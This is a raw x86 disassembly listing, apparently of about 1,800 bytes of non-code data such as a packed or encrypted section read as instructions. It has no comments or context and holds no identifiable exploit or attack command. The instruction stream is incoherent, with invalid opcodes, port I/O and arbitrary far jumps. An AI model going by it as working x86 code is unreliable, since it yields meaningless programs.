  41c894:	dec    BYTE PTR [ecx]
  41c896:	stos   BYTE PTR es:[edi],al
  41c897:	push   0xc367f28e
  41c89c:	mov    edx,0xd404050b
  41c8a1:	in     al,dx
  41c8a2:	das    
  41c8a3:	sub    al,0xb5
  41c8a5:	jg     0x41c8c7
  41c8a7:	mov    al,0xfc
  41c8a9:	dec    ebp
  41c8aa:	and    BYTE PTR [ebp-0x7b],dl
  41c8ad:	jl     0x41c921
  41c8af:	cmp    ah,BYTE PTR [esi-0x39]
  41c8b2:	ins    DWORD PTR es:[edi],dx
  41c8b3:	cdq    
  41c8b4:	leave  
  41c8b5:	adc    DWORD PTR [ebx-0x27cb0160],0x801a975d
  41c8bf:	xor    eax,DWORD PTR [ebp+0x67]
  41c8c2:	pop    ecx
  41c8c3:	mov    esp,0xe557e62
  41c8c8:	inc    eax
  41c8c9:	fstp   TBYTE PTR [edi-0x2e]
  41c8cc:	xor    ebx,DWORD PTR [ebx+edi*1+0x56dd3045]
  41c8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8d4:	mov    eax,0x9576c5ae
  41c8d9:	cmp    DWORD PTR [ecx+0x7e],esi
  41c8dc:	scas   al,BYTE PTR es:[edi]
  41c8dd:	ja     0x41c8d0
  41c8df:	leave  
  41c8e0:	ins    DWORD PTR es:[edi],dx
  41c8e1:	jb     0x41c960
  41c8e3:	shr    DWORD PTR [ecx],0x1c
  41c8e6:	test   esi,edx
  41c8e8:	pop    edi
  41c8e9:	fstp   TBYTE PTR [edi]
  41c8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ec:	fnstcw WORD PTR [ecx+0x1aa6c2bc]
  41c8f2:	mov    ebx,0xcd641cf7
  41c8f7:	cmp    DWORD PTR [ebp-0x7b],edx
  41c8fa:	mov    WORD PTR [ecx+0x33],ds
  41c8fd:	inc    eax
  41c8fe:	mov    bl,0xe8
  41c900:	(bad)  
  41c901:	mov    ecx,0xdf46a176
  41c906:	add    eax,DWORD PTR [ebp+edx*4-0x286338e2]
  41c90d:	arpl   WORD PTR [ecx+0x678134b3],bx
  41c913:	mov    WORD PTR [ecx+0x3094e6f2],ds
  41c919:	int    0x2e
  41c91b:	lahf   
  41c91c:	retf   
  41c91d:	cmc    
  41c91e:	retf   0xee12
  41c921:	aam    0x6
  41c923:	sbb    eax,0x7c561896
  41c928:	or     ebp,esi
  41c92a:	jbe    0x41c909
  41c92c:	pop    ebp
  41c92d:	push   ebp
  41c92e:	jo     0x41c8cf
  41c930:	jmp    0x41c94b
  41c932:	(bad)  
  41c933:	bound  ebx,QWORD PTR [ebx-0x3f]
  41c936:	or     ebp,eax
  41c938:	pop    es
  41c939:	out    dx,al
  41c93a:	xor    eax,0x608cbd2
  41c93f:	mov    ebp,0xab6eda5d
  41c944:	inc    esp
  41c945:	jecxz  0x41c9b4
  41c947:	out    0x27,al
  41c949:	mov    WORD PTR [ecx],?
  41c94b:	cmp    ecx,ebp
  41c94d:	cli    
  41c94e:	and    ebx,ebx
  41c950:	es inc ebx
  41c952:	pop    eax
  41c953:	repnz xor DWORD PTR cs:[edx],0x6b3d31
  41c95b:	inc    edi
  41c95c:	lods   al,BYTE PTR ds:[esi]
  41c95d:	rol    BYTE PTR [ebp-0x5c],0x1e
  41c961:	dec    ebx
  41c962:	int3   
  41c963:	rcl    DWORD PTR [edi],1
  41c965:	dec    ecx
  41c966:	call   0x60e1b649
  41c96b:	inc    ebx
  41c96c:	or     cl,dl
  41c96e:	xchg   edx,eax
  41c96f:	xchg   DWORD PTR [edx+0xf8fc630],edx
  41c975:	scas   eax,DWORD PTR es:[edi]
  41c976:	sub    dh,ah
  41c978:	xlat   BYTE PTR ds:[ebx]
  41c979:	or     ecx,DWORD PTR [esi]
  41c97b:	faddp  st(4),st
  41c97d:	mov    al,0x61
  41c97f:	jg     0x41c95c
  41c981:	cmp    esi,DWORD PTR [edi]
  41c983:	(bad)  
  41c984:	out    dx,al
  41c985:	loop   0x41c950
  41c987:	in     eax,0xd9
  41c989:	add    eax,DWORD PTR [ebx-0x69350fa9]
  41c98f:	popf   
  41c990:	xchg   edi,eax
  41c991:	push   cs
  41c992:	sub    edx,ecx
  41c994:	sbb    BYTE PTR [edi+0x50],0x61
  41c998:	or     eax,0xb8e0b0a3
  41c99d:	fisubr DWORD PTR [eax*8+0x66cb89f2]
  41c9a4:	jo     0x41ca1d
  41c9a6:	mov    cl,0x42
  41c9a8:	mov    bl,0xc0
  41c9aa:	mov    ecx,0xe968be96
  41c9af:	gs push edi
  41c9b1:	lds    ebp,FWORD PTR [edi-0x46]
  41c9b4:	and    dh,dl
  41c9b6:	push   ebp
  41c9b7:	out    dx,eax
  41c9b8:	add    bl,BYTE PTR [ebp+0x49312cd7]
  41c9be:	xchg   esi,eax
  41c9bf:	xlat   BYTE PTR ds:[ebx]
  41c9c0:	outs   dx,BYTE PTR ds:[esi]
  41c9c1:	mov    esp,0xaac9770
  41c9c6:	rcr    DWORD PTR [edx-0x7fa99b7d],cl
  41c9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9cd:	dec    ebp
  41c9ce:	pop    es
  41c9cf:	or     DWORD PTR [esi+0x2c43d4fb],eax
  41c9d5:	pusha  
  41c9d6:	call   DWORD PTR ds:0xbf9d21bb
  41c9dc:	pop    ds
  41c9dd:	mov    eax,ds:0xb568ef48
  41c9e2:	cmp    esi,DWORD PTR [ecx]
  41c9e4:	inc    edx
  41c9e5:	imul   esp,edx,0xffffffca
  41c9e8:	sub    DWORD PTR [esi-0x24],0xedd7f005
  41c9ef:	dec    esp
  41c9f0:	mov    eax,ds:0x84c30e56
  41c9f5:	or     cl,BYTE PTR [esi]
  41c9f7:	sbb    eax,0xebd68a3a
  41c9fc:	stos   BYTE PTR es:[edi],al
  41c9fd:	jno    0x41ca40
  41c9ff:	cs es or eax,0x1b36c295
  41ca06:	inc    eax
  41ca07:	inc    DWORD PTR [ecx]
  41ca09:	cmp    BYTE PTR [edi+0x27],ah
  41ca0c:	xor    eax,0xd983414e
  41ca11:	push   ebp
  41ca12:	js     0x41c9e2
  41ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca15:	xchg   esi,eax
  41ca16:	pop    ecx
  41ca17:	scas   eax,DWORD PTR es:[edi]
  41ca18:	ds fwait
  41ca1a:	mov    ebp,0x4579e4a5
  41ca1f:	das    
  41ca20:	inc    ebx
  41ca21:	cdq    
  41ca22:	sahf   
  41ca23:	and    eax,0xe4923cfe
  41ca28:	inc    eax
  41ca29:	inc    ebp
  41ca2a:	aad    0x5a
  41ca2c:	xor    DWORD PTR [esi+0x37],edx
  41ca2f:	sbb    BYTE PTR [ebp+eax*8+0x15],bl
  41ca33:	xchg   edi,eax
  41ca34:	and    edx,edi
  41ca36:	ficom  DWORD PTR [esi]
  41ca38:	data16 in al,dx
  41ca3a:	pop    ebp
  41ca3b:	int3   
  41ca3c:	cmp    esp,edi
  41ca3e:	popf   
  41ca3f:	arpl   WORD PTR [ebx+ebp*4+0x38],dx
  41ca43:	fnstenv ds:0x68098a8
  41ca49:	inc    ebx
  41ca4a:	outs   dx,DWORD PTR ds:[esi]
  41ca4b:	into   
  41ca4c:	xlat   BYTE PTR ds:[ebx]
  41ca4d:	and    esi,edx
  41ca4f:	inc    eax
  41ca50:	mov    cl,0x7f
  41ca52:	mov    cl,0xb7
  41ca54:	add    cl,cl
  41ca56:	iret   
  41ca57:	cs pop ebx
  41ca59:	sub    ebp,DWORD PTR [eax-0x39bb66da]
  41ca5f:	cmp    BYTE PTR [edi-0x26],bl
  41ca62:	jno    0x41ca29
  41ca64:	and    al,0xb4
  41ca66:	test   eax,0x40fa3c5b
  41ca6b:	pop    ebx
  41ca6c:	push   ebx
  41ca6d:	inc    edx
  41ca6e:	cmp    al,0xe9
  41ca70:	aas    
  41ca71:	xchg   ebp,eax
  41ca72:	mov    ebx,DWORD PTR [esi-0x3]
  41ca75:	push   eax
  41ca76:	cdq    
  41ca77:	push   cs
  41ca78:	add    al,0x43
  41ca7a:	test   DWORD PTR [edx+0x59cbccc9],ebx
  41ca80:	mov    esp,0x459f158e
  41ca85:	pop    ebx
  41ca86:	push   edi
  41ca87:	adc    bh,al
  41ca89:	scas   eax,DWORD PTR es:[edi]
  41ca8a:	shl    al,cl
  41ca8c:	les    eax,FWORD PTR ds:0x1dc68bff
  41ca92:	lahf   
  41ca93:	ror    BYTE PTR [esi+edx*4],1
  41ca96:	and    bl,bl
  41ca98:	adc    esp,DWORD PTR [edx]
  41ca9a:	rcr    BYTE PTR [eax+0xdab4684],1
  41caa0:	mov    dh,0x5
  41caa2:	or     BYTE PTR [ecx+0x52c9bd9f],al
  41caa8:	in     al,0x9
  41caaa:	jmp    0xd77e1274
  41caaf:	dec    eax
  41cab0:	inc    ebx
  41cab1:	pop    ebp
  41cab2:	xchg   esp,eax
  41cab3:	cwde   
  41cab4:	add    ecx,esp
  41cab6:	ret    
  41cab7:	cld    
  41cab8:	pop    esp
  41cab9:	pop    ds
  41caba:	or     DWORD PTR [eax+0x22],ecx
  41cabd:	mov    BYTE PTR [ecx-0x43],0x7d
  41cac1:	dec    ebx
  41cac2:	lods   al,BYTE PTR ds:[esi]
  41cac3:	mov    dl,BYTE PTR [ebp-0x37]
  41cac6:	and    eax,eax
  41cac8:	jmp    0x41caa0
  41caca:	inc    ecx
  41cacb:	in     eax,0xfa
  41cacd:	(bad)  
  41cace:	sbb    DWORD PTR [ecx+0x9],esp
  41cad1:	xchg   ebp,eax
  41cad2:	dec    eax
  41cad3:	jb     0x41cb0e
  41cad5:	add    DWORD PTR [edx],ecx
  41cad7:	iret   
  41cad8:	or     DWORD PTR [edx],esp
  41cada:	data16 add ch,ah
  41cadd:	popf   
  41cade:	fnstcw WORD PTR [edi]
  41cae0:	and    ch,BYTE PTR [edx+0x6f]
  41cae3:	xlat   BYTE PTR ds:[ebx]
  41cae4:	sbb    BYTE PTR gs:[ecx+ebp*1+0x39233620],al
  41caec:	cdq    
  41caed:	and    edx,DWORD PTR [eax+0x2f9c48f8]
  41caf3:	cli    
  41caf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf5:	pusha  
  41caf6:	and    bl,BYTE PTR [ebx+0x3]
  41caf9:	or     al,0xf9
  41cafb:	sub    ah,BYTE PTR [ecx]
  41cafd:	rol    DWORD PTR [eax+0x2c],1
  41cb00:	sahf   
  41cb01:	ror    DWORD PTR [esi+0x46],0xf7
  41cb05:	jns    0x41cb5b
  41cb07:	fwait
  41cb08:	hlt    
  41cb09:	gs cli 
  41cb0b:	xor    BYTE PTR [ebp-0x58],0xee
  41cb0f:	adc    al,0x83
  41cb11:	push   es
  41cb12:	xchg   ebx,eax
  41cb13:	stos   BYTE PTR es:[edi],al
  41cb14:	sbb    ch,BYTE PTR [ebx+0x75]
  41cb17:	cs aas 
  41cb19:	jmp    0x41cb47
  41cb1b:	push   edi
  41cb1c:	jmp    0x6392ba4
  41cb21:	xchg   esi,eax
  41cb22:	mul    DWORD PTR [edi-0xbe5903f]
  41cb28:	xchg   esi,eax
  41cb29:	lea    eax,[ecx+0x1e20db37]
  41cb2f:	out    dx,eax
  41cb30:	into   
  41cb31:	pop    ebx
  41cb32:	mov    ?,WORD PTR [ecx-0x3c6feeb0]
  41cb38:	xor    ax,0x8719
  41cb3c:	stos   BYTE PTR es:[edi],al
  41cb3d:	fdivr  QWORD PTR [ecx-0x1acdfe40]
  41cb43:	add    ecx,ebp
  41cb45:	ja     0x41cb76
  41cb47:	adc    eax,0xe7f7eedc
  41cb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4d:	fs (bad) 
  41cb4f:	mov    esp,0x22246f26
  41cb54:	jle    0x41cb99
  41cb56:	ins    BYTE PTR es:[edi],dx
  41cb57:	push   es
  41cb58:	leave  
  41cb59:	imul   edx,ecx,0x8bfd87d7
  41cb5f:	gs adc ebx,edx
  41cb62:	mov    edi,0x6a084426
  41cb67:	sbb    al,0xce
  41cb69:	or     BYTE PTR [eax+0x54],0x89
  41cb6d:	enter  0x1922,0xbc
  41cb71:	sub    al,0x36
  41cb73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb74:	bound  ebx,QWORD PTR [esi+0xa]
  41cb77:	jbe    0x41cbcb
  41cb79:	xor    eax,0xb1651ec7
  41cb7e:	or     BYTE PTR [edx],dl
  41cb80:	cdq    
  41cb81:	inc    ebx
  41cb82:	sub    edx,DWORD PTR [edx-0x374184ec]
  41cb88:	push   ds
  41cb89:	imul   esi,DWORD PTR [ecx],0x2d064362
  41cb8f:	mov    WORD PTR [ebx],gs
  41cb91:	mov    esi,0x13920d22
  41cb96:	cmp    ecx,DWORD PTR [edx]
  41cb98:	xor    ecx,esi
  41cb9a:	lds    ebx,FWORD PTR [edx]
  41cb9c:	outs   dx,BYTE PTR ds:[esi]
  41cb9d:	push   ebp
  41cb9e:	test   BYTE PTR [ebp+eax*1+0x49],dh
  41cba2:	les    esi,FWORD PTR [edi-0x38]
  41cba5:	mov    DWORD PTR [esp+ebx*1+0x4a],ebx
  41cba9:	loop   0x41cb90
  41cbab:	clc    
  41cbac:	mov    eax,0x219d02a8
  41cbb1:	cdq    
  41cbb2:	add    eax,0xfb63841b
  41cbb7:	cli    
  41cbb8:	inc    edi
  41cbb9:	neg    bl
  41cbbb:	pop    ecx
  41cbbc:	ret    
  41cbbd:	push   ebx
  41cbbe:	ins    DWORD PTR es:[edi],dx
  41cbbf:	test   BYTE PTR [ecx-0x6888063d],ch
  41cbc5:	inc    edx
  41cbc6:	push   ebp
  41cbc7:	push   ebx
  41cbc8:	jno    0x41cb94
  41cbca:	neg    DWORD PTR ds:0x16fb31cd
  41cbd0:	cld    
  41cbd1:	lds    edx,FWORD PTR ds:0x4e3be7b0
  41cbd7:	xchg   ebx,eax
  41cbd8:	test   DWORD PTR [edx],edx
  41cbda:	scas   al,BYTE PTR es:[edi]
  41cbdb:	jg     0x41cbbe
  41cbdd:	jae    0x41cb6a
  41cbdf:	rcl    DWORD PTR [eax+0xe5b200e],0x62
  41cbe6:	add    BYTE PTR [ebx-0x30],ah
  41cbe9:	sbb    BYTE PTR ds:0x451157fc,cl
  41cbef:	gs and eax,0x9d6af21f
  41cbf5:	out    0xf3,al
  41cbf7:	cld    
  41cbf8:	pop    eax
  41cbf9:	xchg   esi,eax
  41cbfa:	xor    al,BYTE PTR [ebp*4+0x68a36337]
  41cc01:	mov    eax,0x59b50340
  41cc06:	mov    dl,0x67
  41cc08:	and    ebp,DWORD PTR [edi-0xeb3ec2d]
  41cc0e:	jns    0x41cbca
  41cc10:	fabs   
  41cc12:	neg    DWORD PTR [eax+0x2a]
  41cc15:	push   es
  41cc16:	sbb    al,0xc2
  41cc18:	dec    BYTE PTR [eax-0x5a15f23]
  41cc1e:	push   edi
  41cc1f:	mov    ch,0xa3
  41cc21:	xlat   BYTE PTR ds:[ebx]
  41cc22:	sbb    al,0xd7
  41cc24:	jg     0x41cc8c
  41cc26:	iret   
  41cc27:	mov    ah,0xa
  41cc29:	push   edx
  41cc2a:	lahf   
  41cc2b:	adc    dl,BYTE PTR [ebx]
  41cc2d:	inc    ecx
  41cc2e:	inc    edx
  41cc2f:	push   ebp
  41cc30:	jecxz  0x41cca4
  41cc32:	mov    dh,0x4f
  41cc34:	loopne 0x41ccaa
  41cc36:	pop    ds
  41cc37:	int3   
  41cc38:	inc    eax
  41cc39:	push   esi
  41cc3a:	ficomp WORD PTR [ebp+0x9e1e68b]
  41cc40:	addr16 cmc 
  41cc42:	dec    esp
  41cc43:	pop    esp
  41cc44:	and    al,BYTE PTR [ebp-0x140be0cd]
  41cc4a:	inc    ebx
  41cc4b:	ret    
  41cc4c:	outs   dx,DWORD PTR ds:[esi]
  41cc4d:	dec    esp
  41cc4e:	mov    edi,0x8a7f1bcc
  41cc53:	neg    DWORD PTR [edx]
  41cc55:	leave  
  41cc56:	mov    ah,0xff
  41cc58:	rcr    cl,cl
  41cc5a:	mov    bh,dh
  41cc5c:	scas   al,BYTE PTR es:[edi]
  41cc5d:	xor    edi,DWORD PTR [edi]
  41cc5f:	push   esi
  41cc60:	mov    DWORD PTR [edx-0x169e605c],edi
  41cc66:	icebp  
  41cc67:	fs in  eax,0xc5
  41cc6a:	pop    es
  41cc6b:	mov    WORD PTR fs:[ecx],ds
  41cc6e:	aam    0xc2
  41cc70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc71:	repnz xor DWORD PTR [ecx],ebp
  41cc74:	lds    ebx,FWORD PTR [eax+0x1b6ce0d3]
  41cc7a:	or     DWORD PTR ss:[ebx+esi*8],esp
  41cc7e:	mov    edx,0xf22b6dc
  41cc83:	ret    0x878
  41cc86:	fldenv [edi+0x6d863ff]
  41cc8c:	inc    BYTE PTR [edi-0x6c]
  41cc8f:	jge    0x41cca4
  41cc91:	pop    esi
  41cc92:	call   0xc49a8d83
  41cc97:	shl    DWORD PTR [edi+0x546222b5],cl
  41cc9d:	aas    
  41cc9e:	shl    DWORD PTR [esi],1
  41cca0:	gs jg  0x41ccd3
  41cca3:	xor    dl,dh
  41cca5:	pop    ebp
  41cca6:	cmp    ecx,DWORD PTR [eax+0x74]
  41cca9:	shl    DWORD PTR [edi+0x374db15],1
  41ccaf:	sbb    DWORD PTR ds:0x75c664b0,edx
  41ccb5:	add    al,0x48
  41ccb7:	mov    ds:0x3aeac507,al
  41ccbc:	push   edi
  41ccbd:	pop    eax
  41ccbe:	mov    DWORD PTR [edx+eiz*4+0x6f],ebx
  41ccc2:	mov    al,ah
  41ccc4:	mov    cl,dh
  41ccc6:	js     0x41ccac
  41ccc8:	mov    eax,0xd4da1815
  41cccd:	xchg   edx,eax
  41ccce:	outs   dx,DWORD PTR ds:[esi]
  41cccf:	(bad)  
  41ccd0:	scas   al,BYTE PTR es:[edi]
  41ccd1:	mov    BYTE PTR [eax+0x6f4131fb],ch
  41ccd7:	mov    ah,0x58
  41ccd9:	cdq    
  41ccda:	mov    dh,0x4
  41ccdc:	mov    dl,0xcb
  41ccde:	cmp    ecx,eax
  41cce0:	jmp    0xc42b:0xd82e195c
  41cce7:	loope  0x41cd15
  41cce9:	aaa    
  41ccea:	xor    al,0x51
  41ccec:	push   ss
  41cced:	sbb    eax,0x79d78f28
  41ccf2:	sub    bh,BYTE PTR [edx]
  41ccf4:	adc    DWORD PTR [edi],esi
  41ccf6:	add    ebp,DWORD PTR [eax+0x2ae3d173]
  41ccfc:	xor    ah,ah
  41ccfe:	dec    edi
  41ccff:	xchg   BYTE PTR [ecx+0x3e],dl
  41cd02:	push   ss
  41cd03:	les    ecx,FWORD PTR [esi]
  41cd05:	xlat   BYTE PTR ds:[ebx]
  41cd06:	loope  0x41cd42
  41cd08:	test   eax,esi
  41cd0a:	pusha  
  41cd0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd0c:	jo     0x41cc91
  41cd0e:	mov    ds:0x19af0b2e,al
  41cd13:	shr    BYTE PTR ds:[ebx-0x6f73da89],cl
  41cd1a:	mov    dh,BYTE PTR [esi+0x40]
  41cd1d:	int3   
  41cd1e:	pop    ss
  41cd1f:	mov    al,0x5f
  41cd21:	xchg   edi,eax
  41cd22:	ja     0x41cd16
  41cd24:	mov    edx,0x791187f5
  41cd29:	loop   0x41cd2a
  41cd2b:	jl     0x41cd6c
  41cd2d:	mov    bh,0x1f
  41cd2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd30:	sti    
  41cd31:	sub    BYTE PTR [ecx],dh
  41cd33:	dec    eax
  41cd34:	push   cs
  41cd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd36:	sub    dh,BYTE PTR [ecx]
  41cd38:	or     al,BYTE PTR [eiz*8-0x74d968a3]
  41cd3f:	push   edx
  41cd40:	subps  xmm0,xmm4
  41cd43:	outs   dx,BYTE PTR ds:[esi]
  41cd44:	ins    DWORD PTR es:[edi],dx
  41cd45:	push   edx
  41cd46:	push   esi
  41cd47:	inc    edx
  41cd48:	arpl   dx,si
  41cd4a:	mov    eax,ds:0x1b9e98d7
  41cd4f:	outs   dx,DWORD PTR ds:[esi]
  41cd50:	fild   WORD PTR [eax]
  41cd52:	lock (bad) 
  41cd54:	and    DWORD PTR [ebx+0x37d3176b],edi
  41cd5a:	das    
  41cd5b:	data16 jo 0x41cdb6
  41cd5e:	je     0x41cdb3
  41cd60:	sub    eax,0x8e88b3c
  41cd65:	jne    0x41cceb
  41cd67:	xchg   edi,eax
  41cd68:	int3   
  41cd69:	je     0x41cddf
  41cd6b:	sbb    eax,0x597ed3ea
  41cd70:	pop    es
  41cd71:	ins    BYTE PTR es:[edi],dx
  41cd72:	scas   eax,DWORD PTR es:[edi]
  41cd73:	inc    esp
  41cd74:	jno    0x41cd16
  41cd76:	idiv   BYTE PTR [edi-0xe]
  41cd79:	enter  0x59d6,0x10
  41cd7d:	arpl   dx,dx
  41cd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd80:	mov    ebp,0x951b597b
  41cd85:	fsub   st,st(7)
  41cd87:	push   0xffffffd7
  41cd89:	or     esp,edi
  41cd8b:	ret    
  41cd8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd8d:	xchg   esp,eax
  41cd8e:	fild   DWORD PTR [edx+ebp*8]
  41cd91:	push   eax
  41cd92:	xor    eax,0xcedb59be
  41cd97:	das    
  41cd98:	call   0xf340c753
  41cd9d:	mov    bh,0x13
  41cd9f:	mov    ah,0xcb
  41cda1:	mov    eax,ds:0xaae833a0
  41cda6:	outs   dx,BYTE PTR ds:[esi]
  41cda7:	mov    ah,0x6c
  41cda9:	inc    eax
  41cdaa:	inc    esp
  41cdab:	jb     0x41cd75
  41cdad:	retf   
  41cdae:	jle    0x41cd30
  41cdb0:	lock ins BYTE PTR es:[edi],dx
  41cdb2:	retf   0x74d9
  41cdb5:	sbb    eax,0x7942d25
  41cdba:	push   eax
  41cdbb:	out    dx,al
  41cdbc:	push   edi
  41cdbd:	push   ebx
  41cdbe:	call   0x7ce2e319
  41cdc3:	jmp    0x41cda7
  41cdc5:	xor    DWORD PTR [ebp+0x56],esp
  41cdc8:	aad    0x2f
  41cdca:	inc    ebp
  41cdcb:	or     esp,eax
  41cdcd:	jmp    0xbec2:0xccf4cb43
  41cdd4:	mov    dh,0x7c
  41cdd6:	add    ch,0x4a
  41cdd9:	test   al,0xff
  41cddb:	sti    
  41cddc:	xlat   BYTE PTR ds:[ebx]
  41cddd:	ror    BYTE PTR [ebp-0x7718ce25],1
  41cde3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cde4:	outs   dx,BYTE PTR ds:[esi]
  41cde5:	enter  0xdb7f,0x36
  41cde9:	test   al,0xc7
  41cdeb:	loop   0x41cd7d
  41cded:	mov    DWORD PTR [esi+0x5e],ebp
  41cdf0:	pop    ds
  41cdf1:	je     0x41ce3a
  41cdf3:	mov    dh,0x5e
  41cdf5:	mov    ?,WORD PTR [esi+0x6cef1d23]
  41cdfb:	leave  
  41cdfc:	pop    eax
  41cdfd:	rcr    BYTE PTR [edi],0xa2
  41ce00:	mov    cl,0x38
  41ce02:	scas   al,BYTE PTR es:[edi]
  41ce03:	pop    esp
  41ce04:	sub    BYTE PTR [ebx],dl
  41ce06:	sbb    ecx,ebp
  41ce08:	int    0xfa
  41ce0a:	adc    BYTE PTR [edx+0x473a40ec],0xfa
  41ce11:	stc    
  41ce12:	inc    esi
  41ce13:	push   edi
  41ce14:	pop    edi
  41ce15:	jp     0x41ce18
  41ce17:	fiadd  DWORD PTR [ebx-0x61]
  41ce1a:	jge    0x41ce85
  41ce1c:	jmp    0xfb90:0x462c4adb
  41ce23:	sub    ch,BYTE PTR [ebp+edi*2-0x600a50b9]
  41ce2a:	mov    ebx,0xc518d45
  41ce2f:	adc    bl,BYTE PTR [esi]
  41ce31:	sbb    esi,0x67b84fd9
  41ce37:	sub    BYTE PTR [edx+0x239a0423],bh
  41ce3d:	iret   
  41ce3e:	test   DWORD PTR [edi+0x57da14b8],ecx
  41ce44:	jp     0x41ce20
  41ce46:	sub    eax,DWORD PTR [eax-0x69]
  41ce49:	cmp    ebx,DWORD PTR [esp+eax*8-0x5df81f74]
  41ce50:	call   FWORD PTR [edx+edi*4]
  41ce53:	push   0x175bf73b
  41ce58:	dec    ebp
  41ce59:	mov    al,ds:0xcf5d7bf9
  41ce5e:	jne    0x41cdf7
  41ce60:	xor    al,0xae
  41ce62:	ins    DWORD PTR es:[edi],dx
  41ce63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce64:	xchg   ebx,eax
  41ce65:	adc    dl,ah
  41ce67:	push   esp
  41ce68:	jp     0x41cdeb
  41ce6a:	inc    esi
  41ce6b:	ficomp WORD PTR [esi+0x73ec4406]
  41ce71:	inc    edx
  41ce72:	push   edx
  41ce73:	std    
  41ce74:	push   ecx
  41ce75:	aad    0x27
  41ce77:	pushf  
  41ce78:	mov    ecx,0x1417971b
  41ce7d:	mov    esi,esi
  41ce7f:	scas   eax,DWORD PTR es:[edi]
  41ce80:	mov    ds:0x567c9809,al
  41ce85:	sahf   
  41ce86:	ins    DWORD PTR es:[edi],dx
  41ce87:	push   ebp
  41ce88:	test   al,0xed
  41ce8a:	mov    bl,BYTE PTR [ecx+0x15b401]
  41ce90:	call   0xcbd430ac
  41ce95:	mov    ch,0xfe
  41ce97:	dec    edx
  41ce98:	dec    edi
  41ce99:	repnz loopne 0x41cec8
  41ce9c:	mov    ebx,0x7708e467
  41cea1:	push   ds
  41cea2:	repnz cmp edx,edi
  41cea5:	xlat   BYTE PTR ds:[ebx]
  41cea6:	lods   al,BYTE PTR ds:[esi]
  41cea7:	adc    BYTE PTR [eax+0x4b53d6a3],0xf4
  41ceae:	xchg   edi,eax
  41ceaf:	sbb    BYTE PTR [edi-0x7b],bl
  41ceb2:	xchg   edi,eax
  41ceb3:	and    ebx,DWORD PTR [ebp-0x64]
  41ceb6:	jnp    0x41ce66
  41ceb8:	jecxz  0x41cee4
  41ceba:	sub    al,0x66
  41cebc:	cmp    esi,edx
  41cebe:	mov    edi,DWORD PTR [edi]
  41cec0:	jb     0x41cf06
  41cec2:	arpl   WORD PTR [eax],si
  41cec4:	ins    BYTE PTR es:[edi],dx
  41cec5:	dec    ebp
  41cec6:	dec    eax
  41cec7:	pop    ebx
  41cec8:	adc    eax,0x86e852
  41cecd:	jmp    0x8f39:0x352581bb
  41ced4:	adc    al,0xd2
  41ced6:	cli    
  41ced7:	pop    eax
  41ced8:	rcr    BYTE PTR ss:[edx],0x64
  41cedc:	add    BYTE PTR [eax-0x1d],bl
  41cedf:	out    dx,eax
  41cee0:	mov    eax,ds:0xf9a7254f
  41cee5:	sub    DWORD PTR [ebx+0x4f],edi
  41cee8:	cdq    
  41cee9:	idiv   DWORD PTR [esi]
  41ceeb:	fwait
  41ceec:	repnz mov ecx,0x2762d96f
  41cef2:	sbb    al,0x87
  41cef4:	pop    ebx
  41cef5:	push   0xffffffe1
  41cef7:	pop    edx
  41cef8:	sahf   
  41cef9:	sar    DWORD PTR [edi],0xb5
  41cefc:	cmc    
  41cefd:	dec    ecx
  41cefe:	xor    eax,eax
  41cf00:	jle    0x41cef7
  41cf02:	mov    ds:0x71fee883,al
  41cf07:	mov    al,0xe0
  41cf09:	sbb    eax,0x77bce5b6
  41cf0e:	mov    esp,0xc6fc352f
  41cf13:	jnp    0x41ce97
  41cf15:	push   0x2e
  41cf17:	stos   DWORD PTR es:[edi],eax
  41cf18:	cmp    eax,DWORD PTR [ebx]
  41cf1a:	hlt    
  41cf1b:	lods   al,BYTE PTR ds:[esi]
  41cf1c:	clc    
  41cf1d:	adc    al,0x7b
  41cf1f:	jl     0x41cef7
  41cf21:	xchg   edi,eax
  41cf22:	pop    ds
  41cf23:	sub    al,BYTE PTR [ebp+0x53]
  41cf26:	fucom  st(3)
  41cf28:	ins    BYTE PTR es:[edi],dx
  41cf29:	loopne 0x41cf95
  41cf2b:	mov    dl,0xf4
  41cf2d:	mov    ds:0x1dddb52f,al
  41cf32:	and    eax,0x1d937102
  41cf37:	ins    DWORD PTR es:[di],dx
  41cf39:	retf   
  41cf3a:	or     esi,DWORD PTR [ecx]
  41cf3c:	and    cl,cl
  41cf3e:	scas   eax,DWORD PTR es:[edi]
  41cf3f:	mov    ebp,0x69bc28bf
  41cf44:	sub    eax,0xaebd5a12
  41cf49:	int3   
  41cf4a:	test   BYTE PTR [eax+0x6c],dl
  41cf4d:	push   edx
  41cf4e:	call   0xf701:0x5c84ea6f
  41cf55:	fstp   QWORD PTR [edx]
  41cf57:	into   
  41cf58:	fdivr  QWORD PTR [esi+0x70f5ae62]
  41cf5e:	push   ds
  41cf5f:	test   eax,ebp
  41cf61:	js     0x41cf88
  41cf63:	ja     0x41cfc5
  41cf65:	outs   dx,DWORD PTR ds:[esi]
  41cf66:	ins    DWORD PTR es:[edi],dx
  41cf67:	loopne 0x41cfd3
  41cf69:	jne    0x41cf73
  41cf6b:	sub    esp,esp
  41cf6d:	bound  edi,QWORD PTR [edi]
  41cf6f:	jle    0x41cf71
  41cf71:	fld    TBYTE PTR [esp+eiz*2-0x72]
  41cf75:	into   
  41cf76:	dec    ecx
  41cf77:	pop    ds
  41cf78:	pop    eax
  41cf79:	imul   esp,DWORD PTR [edx+0x7d],0xd8655c18
  41cf80:	dec    ebx
  41cf81:	retf   
  41cf82:	popa   
  41cf83:	out    dx,eax
  41cf84:	ret    
  41cf85:	outs   dx,DWORD PTR ds:[esi]
